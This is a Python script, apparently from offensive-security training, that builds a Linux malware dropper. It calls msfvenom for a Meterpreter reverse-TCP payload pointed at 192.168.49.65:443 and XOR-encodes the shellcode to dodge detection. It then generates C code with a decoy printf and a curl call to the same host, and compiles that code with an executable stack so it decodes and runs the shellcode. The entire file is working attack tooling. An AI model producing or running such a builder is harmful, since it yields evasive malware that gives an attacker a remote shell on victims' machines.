#!/bin/env python3
from ak import *
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 443
OUT_FILENAME = 'msf-linux-x64'
MSFVENOM_CMD = f"msfvenom -a x64 --platform Linux -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none -b '\\x03' prependfork=true -t 300"

def generate_c(shellcode):

  template = """
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <sys/mman.h>

  int main (int argc, char **argv)
  {{
      printf("I love programming.");
      system("curl http://192.168.49.65/iran");
      unsigned char *buf = "{xor_shellcode}";
      char xor_key = '\\x03';
      int arraysize = (int) sizeof(buf);
      for (int i=0; i<arraysize-1; i++) {{
        buf[i] = buf[i]^xor_key;
      }}
      int (*ret)() = (int(*)())buf;
        ret();
      return 3;
  }}
  """.format(xor_shellcode=shellcode.get_hex_c())

  print(template)
  return template


def compile_c(c):
  p = subprocess.Popen(['gcc', '-x', 'c', '-o', OUT_FILENAME, '-','-z','execstack'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
  output = p.stdin.write(str.encode(c))
  p.stdin.close()
  print(p.stdout.readline())
  os.chmod(OUT_FILENAME, 0o755)

  print("Wrote " + OUT_FILENAME)

def main():
  shellcode = ShellCode(MSFVENOM_CMD, b'\x03')

  compile_c(generate_c(shellcode))


if __name__ == "__main__":
  main()
